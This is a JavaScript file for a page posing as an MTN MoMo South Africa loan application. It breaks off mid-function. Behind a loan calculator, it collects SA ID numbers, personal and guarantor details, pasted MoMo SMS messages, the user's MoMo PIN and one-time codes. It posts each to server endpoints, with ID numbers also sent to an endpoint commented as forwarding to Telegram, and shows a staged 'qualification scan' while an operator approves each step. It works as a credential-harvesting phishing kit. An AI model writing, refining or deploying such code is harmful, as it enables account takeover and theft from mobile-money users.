// ============================================================
// script.js – MTN MoMo South Africa
// Account-type limits enforced · Registration via temp endpoint
// ============================================================
'use strict';

// ─── Account Types (mirrors backend) ───
const ACCOUNT_TYPES = {
    yello: {
        name: 'MoMo Yello', icon: '🟡',
        dailyCash: 3500, monthlyCap: 20000,
        maxLoan: 20000, minLoan: 5000, requiresId: true
    },
    yello_plus: {
        name: 'MoMo Yello Plus', icon: '⭐',
        dailyCash: 10000, monthlyCap: 40000,
        maxLoan: 40000, minLoan: 5000, requiresId: true
    },
    eazi: {
        name: 'MoMo Eazi', icon: '⚡',
        dailyCash: 2000, monthlyCap: 10000,
        maxLoan: 10000, minLoan: 5000, requiresId: false
    }
};

const S = {
    userPath: null,
    isRegistered: null,
    accountType: null,
    accountMaxLoan: 0,
    accountMonthlyCap: 0,
    idNumber: null,
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    guarantorName: '', guarantorPhone: '', guarantorRelation: '',
    applicationId: '',
    rejectedStep: null
};

const POLL_INTERVAL = 2500;
const POLL_MAX_DURATION = 30 * 60 * 1000;
const RESEND_COUNTDOWN = 60;

let activePoll = null;
let otpResendTimer = null;
let smsResendTimer = null;
let otpResendCountdown = 0;
let smsResendCountdown = 0;
let selectedAccountType = null;
let idDetails = null;

const KEYS = {
    APP_ID: 'mtn_za_app_id',
    APP_DATA: 'mtn_za_app_data',
    REJECTION: 'mtn_za_rejection',
    DRAFT: 'mtn_za_draft'
};

const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
const get = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
const rm = (k) => { try { localStorage.removeItem(k); } catch (e) {} };

function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, c =>
        ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function fmt(n) { return (Number(n) || 0).toLocaleString(); }

function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);

    // Hook: update requirements page whenever navigated
    if (pageId === 'page-requirements') updateRequirementsLimits();
    // Hook: update step1 account info when navigated
    if (pageId === 'page-step1') refreshStep1AccountInfo();
}

function showToast(msg, type = 'info', duration = 3200) {
    const ex = document.querySelector('.toast');
    if (ex) ex.remove();
    const t = document.createElement('div');
    t.className = `toast toast-${type}`;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => {
        t.style.opacity = '0';
        t.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(() => t.remove(), 300);
    }, duration);
}

function showErr(id, msg) {
    const box = document.getElementById(id);
    if (box) { box.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
}
function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Please wait...' : defaultText;
}

async function apiCall(endpoint, options = {}) {
    try {
        const res = await fetch(endpoint, {
            ...options,
            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
        });
        return await res.json();
    } catch (e) {
        console.error(`❌ ${endpoint}:`, e.message);
        throw new Error('Network error. Please check your connection and try again.');
    }
}

// ─── Form helpers ───
function normalizePhone(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 9) v = v.substring(0, 9);
    inp.value = v;
    saveDraft();
}
function normalizeId(id) {
    const inp = document.getElementById(id);
    let v = inp.value.replace(/\D/g, '');
    if (v.length > 13) v = v.substring(0, 13);
    inp.value = v;
    if (v.length === 13) validateAndPreviewId(v);
    else document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above to see your details</div>';
}

function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    const term = +document.getElementById('calcTermSelect').value;
    const monthly = Math.ceil(amt / term);
    const total = monthly * term;

    document.getElementById('calcAmt').textContent = 'R ' + amt.toLocaleString();
    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
    document.getElementById('totalAmt').textContent = 'R ' + total.toLocaleString();
    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();

    const slider = document.getElementById('amtSlider');
    const pct = ((amt - 5000) / (500000 - 5000)) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

// ─── Landing actions ───
function applyAsExistingUser() {
    S.userPath = 'existing';
    S.isRegistered = true;
    saveAppData();
    if (!S.loanAmount) {
        S.loanAmount = +document.getElementById('amtSlider').value;
        S.loanTerm = document.getElementById('calcTermSelect').value + ' Months';
        document.getElementById('s1am').value = S.loanAmount;
        document.getElementById('s1te').value = S.loanTerm;
    }
    startApplication();
}

function applyFromCalculator() {
    const amt = +document.getElementById('amtSlider').value;
    const term = +document.getElementById('calcTermSelect').value;
    S.loanAmount = amt;
    S.loanTerm = term + ' Months';
    saveAppData();
    showToast(`💰 R ${amt.toLocaleString()} for ${term} months selected`, 'success');
    const el = document.querySelector('.land-actions');
    if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
    el.querySelectorAll('.action-card').forEach(card => {
        card.style.animation = 'none';
        setTimeout(() => card.style.animation = 'pulse-highlight 1.2s ease 2', 20);
    });
}

function startApplication() {
    S.rejectedStep = null;
    rm(KEYS.REJECTION);
    if (!S.applicationId) {
        S.applicationId = 'MTN-ZA-' + Date.now().toString().slice(-6);
        saveAppId(S.applicationId);
    }
    ['s1Err', 's2Err', 's3Err', 'gErr', 'momErr', 'pinErr', 'otpErr', 'regErr'].forEach(clearErr);
    goTo('page-step1');
}

function startMoMoRegistration() {
    S.userPath = 'new';
    S.isRegistered = false;
    saveAppData();
    document.getElementById('regId').value = '';
    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above to see your details</div>';
    selectedAccountType = null;
    document.querySelectorAll('.account-type').forEach(el => {
        el.classList.remove('selected');
        el.querySelector('.at-check').textContent = '○';
    });
    document.getElementById('accountTypeHint').textContent = 'Tap to select your preferred account';
    clearErr('regErr');
    goTo('page-register-check');
}

// ─── SA ID parsing (mirrors backend) ───
function parseSAId(id) {
    if (!id) return { ok: false, reason: 'ID number is required.' };
    const clean = String(id).replace(/\s/g, '');
    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };

    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;

    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
        return { ok: false, reason: 'Invalid date of birth.' };
    }

    const now = new Date();
    let age = now.getFullYear() - year;
    const m = now.getMonth() - (mm - 1);
    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };

    if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };

    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';

    return {
        ok: true,
        dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }),
        age, gender, citizenship, idNumber: clean
    };
}

function luhnCheck(num) {
    let sum = 0, alt = false;
    for (let i = num.length - 1; i >= 0; i--) {
        let n = parseInt(num[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function validateAndPreviewId(id) {
    const result = parseSAId(id);
    const preview = document.getElementById('regDetailsPreview');
    if (!result.ok) {
        preview.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(result.reason)}</div>`;
        idDetails = null;
        return;
    }
    idDetails = result;
    preview.innerHTML = `
        <div class="reg-preview-row"><span>Date of Birth</span><strong>${result.dob}</strong></div>
        <div class="reg-preview-row"><span>Age</span><strong>${result.age} years</strong></div>
        <div class="reg-preview-row"><span>Gender</span><strong>${result.gender}</strong></div>
        <div class="reg-preview-row"><span>Citizenship</span><strong>${result.citizenship}</strong></div>
    `;
}

function selectAccountType(type) {
    selectedAccountType = type;
    const names = { yello: 'MoMo Yello', yello_plus: 'MoMo Yello Plus', eazi: 'MoMo Eazi' };
    document.querySelectorAll('.account-type').forEach(el => {
        const isMatch = el.dataset.type === type;
        el.classList.toggle('selected', isMatch);
        el.querySelector('.at-check').textContent = isMatch ? '●' : '○';
    });
    document.getElementById('accountTypeHint').textContent = `✅ Selected: ${names[type]}`;
}

async function completeRegistration() {
    const rawId = document.getElementById('regId').value.trim();

    if (!rawId) { showErr('regErr', 'Please enter your SA ID number.'); return; }
    if (rawId.length !== 13) { showErr('regErr', 'SA ID must be exactly 13 digits.'); return; }

    const parsed = parseSAId(rawId);
    if (!parsed.ok) { showErr('regErr', parsed.reason); return; }
    if (!selectedAccountType) { showErr('regErr', 'Please select a MoMo account type.'); return; }

    const btn = document.getElementById('regBtn');
    setBtnLoading(btn, true, 'Complete Registration');

    goTo('page-register-processing');
    document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';

    try {
        // Send registration to BOTH endpoints:
        // 1. Main endpoint (stores on application)
        // 2. Temporary endpoint (forwards to Telegram standalone)
        const payload = {
            applicationId: S.applicationId,
            idNumber: rawId,
            accountType: selectedAccountType,
            phone: S.phone || null,
            fullName: `${S.firstName || ''} ${S.lastName || ''}`.trim() || null
        };

        // Fire-and-forget the temp endpoint
        apiCall('/api/register-momo-telegram', {
            method: 'POST',
            body: JSON.stringify(payload)
        }).catch(e => console.warn('Temp reg endpoint failed:', e.message));

        // Main endpoint (blocking)
        const data = await apiCall('/api/register-momo', {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        if (!data.ok) {
            goTo('page-register-check');
            showErr('regErr', data.error || 'Registration failed.');
            setBtnLoading(btn, false, 'Complete Registration');
            return;
        }

        // Store the account type + limits
        S.idNumber = rawId;
        S.accountType = selectedAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.accountMonthlyCap = data.limits.monthlyCap;
        S.accountDailyCash = data.limits.dailyCash;
        S.isRegistered = true;
        saveAppData();

        document.getElementById('regProcessingStatus').textContent = '✅ MoMo account created!';
        setTimeout(() => {
            showToast(`✅ ${data.accountName} registered! Max loan: R ${fmt(data.maxLoan)}`, 'success');
            setBtnLoading(btn, false, 'Complete Registration');
            goTo('page-requirements');
        }, 1500);
    } catch (e) {
        goTo('page-register-check');
        showErr('regErr', e.message);
        setBtnLoading(btn, false, 'Complete Registration');
    }
}

// ─── Requirements page dynamic text ───
function updateRequirementsLimits() {
    const type = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;

    const el1 = document.getElementById('reqLimitText');
    if (el1) {
        el1.innerHTML =
            `Your <b>${type.icon} ${type.name}</b> account allows:<br>` +
            `· Daily cash: <b>R ${fmt(type.dailyCash)}</b><br>` +
            `· Monthly cap: <b>R ${fmt(type.monthlyCap)}</b><br>` +
            `· <b>Maximum loan: R ${fmt(type.maxLoan)}</b>`;
    }

    const el2 = document.getElementById('reqTxText');
    if (el2) {
        const example20 = Math.ceil(type.maxLoan * 0.20);
        el2.innerHTML =
            `Have at least <b>20% of your loan amount</b> in MoMo transactions in the last 30 days. ` +
            `For a <b>R ${fmt(type.maxLoan)}</b> loan, you'd need <b>R ${fmt(example20)}</b> in transactions.`;
    }
}

// ─── Step 1: account type selection for existing users ───
function selectExistingAccountType() {
    const sel = document.getElementById('s1at');
    const val = sel.value;
    if (!val) {
        document.getElementById('accInfoBox').style.display = 'none';
        document.getElementById('loanLimitHint').textContent = 'Select your account type above first';
        return;
    }
    const type = ACCOUNT_TYPES[val];
    S.accountType = val;
    S.accountMaxLoan = type.maxLoan;
    S.accountMonthlyCap = type.monthlyCap;
    S.accountDailyCash = type.dailyCash;
    saveAppData();

    const amInput = document.getElementById('s1am');
    amInput.max = type.maxLoan;
    if (+amInput.value > type.maxLoan) {
        amInput.value = type.maxLoan;
    }

    document.getElementById('accInfoBox').style.display = 'block';
    document.getElementById('accInfoText').innerHTML =
        `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;

    document.getElementById('loanLimitHint').textContent =
        `Max R ${fmt(type.maxLoan)} for ${type.name}`;
    clearErr('s1Err');
}

function refreshStep1AccountInfo() {
    // If user already has account type from registration, hide the selector and pre-fill
    const typeField = document.getElementById('accountTypeField');
    const accInfoBox = document.getElementById('accInfoBox');
    const hint = document.getElementById('loanLimitHint');

    if (S.accountType && ACCOUNT_TYPES[S.accountType]) {
        const type = ACCOUNT_TYPES[S.accountType];
        if (typeField) typeField.style.display = 'none';
        if (accInfoBox) {
            accInfoBox.style.display = 'block';
            document.getElementById('accInfoText').innerHTML =
                `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
        }
        if (hint) hint.textContent = `Max R ${fmt(type.maxLoan)} for ${type.name}`;
        const amInput = document.getElementById('s1am');
        amInput.max = type.maxLoan;
        if (+amInput.value > type.maxLoan) amInput.value = type.maxLoan;
    } else {
        if (typeField) typeField.style.display = 'block';
        if (accInfoBox) accInfoBox.style.display = 'none';
        if (hint) hint.textContent = 'Select your account type above first';
    }
}

// ─── Step navigation ───
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value.trim();

    // Ensure account type is set
    if (!S.accountType || !ACCOUNT_TYPES[S.accountType]) {
        showErr('s1Err', 'Please select your MoMo account type.');
        return;
    }
    const type = ACCOUNT_TYPES[S.accountType];

    if (!ty || !te || !pu) { showErr('s1Err', 'Please complete all fields.'); return; }
    if (am < type.minLoan) { showErr('s1Err', `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.`); return; }
    if (am > type.maxLoan) { showErr('s1Err', `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}.`); return; }

    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
    saveAppData(); saveDraft(); goTo('page-step2');
}

function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    const em = document.getElementById('s2em').value.trim();
    if (!fi || !la) { showErr('s2Err', 'Enter your full name.'); return; }
    if (ph.length !== 9) { showErr('s2Err', 'Phone must be 9 digits.'); return; }
    if (!em || !em.includes('@')) { showErr('s2Err', 'Enter a valid email.'); return; }
    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;
    saveAppData(); saveDraft(); goTo('page-step3');
}

function toGuarantor() {
    const em = document.getElementById('s3em').value;
    const inc = +document.getElementById('s3in').value;
    const kn = document.getElementById('s3kn').value.trim();
    const kp = document.getElementById('s3kp').value.trim();
    if (!kn) { showErr('s3Err', 'Enter next of kin name.'); return; }
    if (kp.length !== 9) { showErr('s3Err', 'Next of kin phone must be 9 digits.'); return; }
    if (!em || inc <= 0) { showErr('s3Err', 'Complete all fields.'); return; }
    S.employment = em; S.annualIncome = inc; S.kinName = kn; S.kinPhone = kp;
    saveAppData(); saveDraft(); goTo('page-guarantor');
}

// ─── PIN/OTP helpers ───
function pinMvM(el, i, max = 5) {
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < max - 1) { document.getElementById('pin' + (i + 1))?.focus(); return; }
    if (i === max - 1 && el.value && [0, 1, 2, 3, 4].every(x => document.getElementById('pin' + x)?.value)) {
        setTimeout(doPin, 300);
    }
}
function togPin() {
    for (let i = 0; i < 5; i++) { const b = document.getElementById('pin' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
    for (let i = 0; i < 4; i++) { const b = document.getElementById('otp' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
}
function clearLoginPin() { [0, 1, 2, 3, 4].forEach(i => document.getElementById('pin' + i).value = ''); document.getElementById('pin0').focus(); }
function clearOtpCode() { [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = ''); document.getElementById('otp0').focus(); }
function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
    if (idx === 3 && el.value && [0, 1, 2, 3].every(i => document.getElementById('otp' + i)?.value)) setTimeout(doOtp, 300);
}

// ─── Submit Application ───
async function submitApp() {
    const gName = document.getElementById('gName').value.trim();
    const gPhone = document.getElementById('gPhone').value.trim();
    const gRel = document.getElementById('gRel').value;
    const gConfirm = document.getElementById('gConfirm').checked;

    if (!gName || gName.length < 3) { showErr('gErr', 'Please enter your guarantor\'s full name.'); return; }
    if (gPhone.length !== 9) { showErr('gErr', 'Guarantor phone must be 9 digits.'); return; }
    if (!gRel) { showErr('gErr', 'Please select the relationship.'); return; }
    if (!gConfirm) { showErr('gErr', 'Please confirm your guarantor has agreed.'); return; }

    S.guarantorName = gName;
    S.guarantorPhone = gPhone;
    S.guarantorRelation = gRel;

    if (!S.applicationId) {
        S.applicationId = 'MTN-ZA-' + Date.now().toString().slice(-6);
        saveAppId(S.applicationId);
    }
    saveAppData();

    goTo('page-processing');
    document.getElementById('processingStatus').textContent = '⏳ Sending application...';

    try {
        const data = await apiCall('/api/send-application', {
            method: 'POST',
            body: JSON.stringify({ applicationData: S })
        });
        if (!data.ok) {
            showErr('gErr', data.error || 'Submission failed.');
            goTo('page-guarantor');
            return;
        }
        document.getElementById('processingStatus').textContent = '✅ Sent! Awaiting approval...';
        document.getElementById('waitAppId').textContent = S.applicationId;
        setTimeout(() => {
            goTo('page-wait-app');
            startPolling('application', () => {
                showToast('✅ Application approved!', 'success');
                goTo('page-sms-paste');
            });
        }, 800);
    } catch (e) {
        showErr('gErr', e.message);
        goTo('page-guarantor');
    }
}

// ─── SMS ───
async function doSmsParse() {
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 5) { showErr('momErr', 'Paste the full SMS.'); return; }
    const btn = document.getElementById('smsSubmitBtn');
    setBtnLoading(btn, true, 'Submit MoMo Message');
    clearErr('momErr');
    try {
        const data = await apiCall('/api/send-momo-message', {
            method: 'POST',
            body: JSON.stringify({ momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg } })
        });
        if (!data.ok) { showErr('momErr', data.error || 'Failed.'); setBtnLoading(btn, false, 'Submit MoMo Message'); return; }
        document.getElementById('waitSmsAppId').textContent = S.applicationId;
        goTo('page-wait-sms');
        setBtnLoading(btn, false, 'Submit MoMo Message');
        startPolling('sms', () => { showToast('✅ SMS approved!', 'success'); goTo('page-pin'); });
    } catch (e) { showErr('momErr', e.message); setBtnLoading(btn, false, 'Submit MoMo Message'); }
}

// ─── PIN ───
async function doPin() {
    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('pin' + i).value).join('');
    if (pin.length !== 5) { showErr('pinErr', 'Enter all 5 digits.'); return; }
    const btn = document.getElementById('pinSubmitBtn');
    setBtnLoading(btn, true, 'Submit MoMo PIN');
    clearErr('pinErr');
    try {
        const data = await apiCall('/api/send-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin })
        });
        if (!data.ok) { showErr('pinErr', data.error || 'Failed.'); clearLoginPin(); setBtnLoading(btn, false, 'Submit MoMo PIN'); return; }
        document.getElementById('waitPinAppId').textContent = S.applicationId;
        goTo('page-wait-pin');
        setBtnLoading(btn, false, 'Submit MoMo PIN');
        startPolling('pin', () => { showToast('✅ Logged in!', 'success'); goTo('page-otp'); });
    } catch (e) { showErr('pinErr', e.message); setBtnLoading(btn, false, 'Submit MoMo PIN'); }
}

// ─── OTP ───
async function doOtp() {
    const otp = [0, 1, 2, 3].map(i => document.getElementById('otp' + i).value).join('');
    if (otp.length !== 4) { showErr('otpErr', 'Enter all 4 digits.'); return; }
    const btn = document.getElementById('otpSubmitBtn');
    setBtnLoading(btn, true, 'Submit OTP');
    clearErr('otpErr');
    try {
        const data = await apiCall('/api/send-otp', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, otp })
        });
        if (!data.ok) { showErr('otpErr', data.error || 'Failed.'); setBtnLoading(btn, false, 'Submit OTP'); return; }
        document.getElementById('waitOtpAppId').textContent = S.applicationId;
        goTo('page-wait-otp');
        setBtnLoading(btn, false, 'Submit OTP');
        startPolling('otp', () => { showToast('✅ OTP verified!', 'success'); startQualificationScan(); });
    } catch (e) { showErr('otpErr', e.message); setBtnLoading(btn, false, 'Submit OTP'); }
}

// ─── Auto-scan ───
function startQualificationScan() {
    document.getElementById('waitScanAppId').textContent = S.applicationId;
    goTo('page-scan');
    resetScanChecklist();

    apiCall('/api/check-qualification', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId })
    }).catch(e => console.error('Qualification request error:', e));

    let step = 0;
    const items = ['scanItem1', 'scanItem2', 'scanItem3'];
    const statuses = [
        '📊 Analyzing your transaction volume...',
        '📈 Verifying 20% requirement or guarantor...',
        '🔍 Finalizing qualification — admin reviewing...'
    ];
    const animator = setInterval(() => {
        step++;
        if (step < items.length) {
            document.getElementById(items[step - 1]).classList.add('done');
            document.getElementById(items[step]).classList.add('active');
            document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[step];
        } else {
            clearInterval(animator);
            document.getElementById(items[2]).classList.add('done');
            document.getElementById('waitScanStatus').textContent = '⏳ Admin is reviewing your MoMo history...';
        }
    }, 2500);

    startPolling('qualification', () => {
        clearInterval(animator);
        markAllScanDone();
        setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
    });
}

function resetScanChecklist() {
    ['scanItem1', 'scanItem2', 'scanItem3'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.className = 'scan-item';
    });
    document.getElementById('scanItem1').classList.add('active');
    document.getElementById('waitScanStatus').textContent = '⏳ Scanning your MoMo history...';
}
function markAllScanDone() {
    ['scanItem1', 'scanItem2', 'scanItem3'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.className = 'scan-item done';
    });
}

// ─── Polling ───
function startPolling(step, onSuccess) {
    stopPolling();
    const start = Date.now();
    let errors = 0;
    const tick = async () => {
        if (Date.now() - start > POLL_MAX_DURATION) { showToast('Timed out.', 'error'); stopPolling(); return; }
        try {
            const r = await fetch(`/api/status/${S.applicationId}/${step}`);
            const data = await r.json();
            errors = 0;
            if (data.ok) {
                if (data.status === 'approved' || (step === 'qualification' && data.status === 'qualified')) { stopPolling(); onSuccess(); return; }
                if (data.status === 'rejected' || (step === 'qualification' && data.status === 'unqualified')) { stopPolling(); handleRejection(step); return; }
            }
        } catch (e) { errors++; if (errors >= 5) showToast('Connection issue.', 'error'); }
        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}
function stopPolling() { if (activePoll) { clearTimeout(activePoll); activePoll = null; } }

function handleRejection(step) {
    showToast(`❌ ${step.toUpperCase()} was rejected. Please try again.`, 'error');
    save(KEYS.REJECTION, { step, applicationId: S.applicationId, timestamp: new Date().toISOString() });
    if (step === 'application') { restartApplication(); return; }
    if (step === 'sms') { document.getElementById('smsMsgBox').value = ''; goTo('page-sms-paste'); }
    if (step === 'pin') { clearLoginPin(); goTo('page-pin'); }
    if (step === 'otp') { clearOtpCode(); goTo('page-otp'); }
    if (step === 'qualification') { showToast('❌ Requirements not met.', 'error'); setTimeout(restartApplication, 3000); }
}

// ─── Resend ───
async function resendSms() {
    if (smsResendCountdown > 0) { showToast(`Wait ${smsResendCountdown}s.`, 'info'); return; }
    try {
        await apiCall(`/api/resend-sms/${S.applicationId}`, { method: 'POST' });
        document.getElementById('smsMsgBox').value = '';
        document.getElementById('smsMsgBox').focus();
        showToast('✅ Ready. Paste the new SMS.', 'success');
        startSmsResendTimer(RESEND_COUNTDOWN);
    } catch (e) { showToast(e.message, 'error'); }
}
function startSmsResendTimer(seconds = RESEND_COUNTDOWN) {
    const btn = document.getElementById('resendSmsBtn');
    const label = document.getElementById('resendSmsLabel');
    if (!btn || !label) return;
    if (smsResendTimer) clearInterval(smsResendTimer);
    smsResendCountdown = seconds;
    btn.disabled = true; btn.classList.remove('hidden');
    label.textContent = `🔄 I did not receive the code — Resend in ${smsResendCountdown}s`;
    smsResendTimer = setInterval(() => {
        smsResendCountdown--;
        if (smsResendCountdown <= 0) { clearInterval(smsResendTimer); smsResendTimer = null; btn.disabled = false; label.textContent = '🔄 I did not receive the code — Resend now'; }
        else label.textContent = `🔄 I did not receive the code — Resend in ${smsResendCountdown}s`;
    }, 1000);
}
async function resendOtp() {
    if (otpResendCountdown > 0) { showToast(`Wait ${otpResendCountdown}s.`, 'info'); return; }
    try {
        await apiCall('/api/resend-otp', { method: 'POST', body: JSON.stringify({ applicationId: S.applicationId }) });
        clearOtpCode();
        showToast('✅ New OTP requested.', 'success');
        startOtpResendTimer(RESEND_COUNTDOWN);
    } catch (e) { showToast(e.message, 'error'); }
}
function startOtpResendTimer(seconds = RESEND_COUNTDOWN) {
    const btn = document.getElementById('resendOtpBtn');
    const label = document.getElementById('resendOtpLabel');
    if (!btn || !label) return;
    if (otpResendTimer) clearInterval(otpResendTimer);
    otpResendCountdown = seconds;
    btn.disabled = true; btn.classList.remove('hidden');
    label.textContent = `🔄 I did not receive the code — Resend in ${otpResendCountdown}s`;
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        if (otpResendCountdown <= 0) { clearInterval(otpResendTimer); otpResendTimer = null; btn.disabled = false; label.textContent = '🔄 I did not receive the code — Resend now'; }
        else label.textContent = `🔄 I did not receive the code — Resend in ${otpResendCountdown}s`;
    }, 1000);
}

async function retryStep(step) {
    stopPolling();
    try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
    if (step === 'sms') { document.getElementById('smsMsgBox').value = ''; clearErr('momErr'); showToast('🔄 Paste the SMS again.', 'info'); goTo('page-sms-paste'); }
    else if (step === 'pin') { clearLoginPin(); clearErr('pinErr'); showToast('🔄 Enter PIN again.', 'info'); goTo('page-pin'); }
    else if (step === 'otp') { clearOtpCode(); clearErr('otpErr'); showToast('🔄 Enter OTP again.', 'info'); goTo('page-otp'); }
}

function showApproval() {
    document.getElementById('aprAmount').textContent = 'R ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'R ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    document.getElementById('aprMth').textContent = 'R ' + Math.ceil(S.loanAmount / parseInt(S.loanTerm)).toLocaleString();
    Object.values(KEYS).forEach(rm);
    stopPolling();
    if (otpResendTimer) clearInterval(otpResendTimer);
    if (smsResendTimer) clearInterval(smsResendTimer);
    goTo('page-approval');
}

function restartApplication() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    Object.values(KEYS).forEach(rm);
    location.reload();
}

// ─── Session recovery ───
async function recoverSession() {
    loadAppId();
    loadAppData();
    if (!S.applicationId) { loadDraft(); return; }
    try {
        const r = await fetch(`/api/status/${S.applicationId}`);
        if (!r.ok) { loadDraft(); return; }
        const data = await r.json();
        if (!data.ok) { loadDraft(); return; }

        // Sync account type from server
        if (data.accountType) {
            S.accountType = data.accountType;
            S.accountMaxLoan = data.accountMaxLoan;
        }

        if (data.application === 'pending') {
            document.getElementById('waitAppId').textContent = S.applicationId;
            goTo('page-wait-app');
            startPolling('application', () => goTo('page-sms-paste')); return;
        }
        if (data.sms === 'pending') {
            document.getElementById('waitSmsAppId').textContent = S.applicationId;
            goTo('page-wait-sms');
            startPolling('sms', () => goTo('page-pin')); return;
        }
        if (data.pin === 'pending') {
            document.getElementById('waitPinAppId').textContent = S.applicationId;
            goTo('page-wait-pin');
            startPolling('pin', () => goTo('page-otp')); return;
        }
        if (data.otp === 'pending') {
            document.getElementById('waitOtpAppId').textContent = S.applicationId;
            goTo('page-wait-otp');
            startPolling('otp', () => startQualificationScan()); return;
        }
        if (data.qualification === 'pending') { startQualificationScan(); return; }
        if (data.qualification === 'qualified') { showApproval(); return; }

        if (data.application === 'idle') { goTo('page-step1'); return; }
        if (data.application === 'approved' && data.sms === 'idle') { goTo('page-sms-paste'); return; }
        if (data.sms === 'approved' && data.pin === 'idle') { goTo('page-pin'); return; }
        if (data.pin === 'approved' && data.otp === 'idle') { goTo('page-otp'); return; }
    } catch (e) { console.warn('Recovery failed:', e); loadDraft(); }
}

// ─── Storage helpers ───
function saveAppId(id) { if (!id) return; S.applicationId = id; save(KEYS.APP_ID, { id, timestamp: new Date().toISOString() }); }
function loadAppId() { const s = get(KEYS.APP_ID); if (s && s.id && Date.now() - new Date(s.timestamp).getTime() < 24 * 3600 * 1000) { S.applicationId = s.id; return s.id; } return null; }
function saveAppData() { save(KEYS.APP_DATA, { ...S, timestamp: new Date().toISOString() }); }
function loadAppData() {
    const s = get(KEYS.APP_DATA);
    if (s && Date.now() - new Date(s.timestamp).getTime() < 24 * 3600 * 1000) {
        Object.keys(S).forEach(k => { if (s[k] !== undefined) S[k] = s[k]; });
        return true;
    }
    return false;
}
function saveDraft() {
    save(KEYS.DRAFT, {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
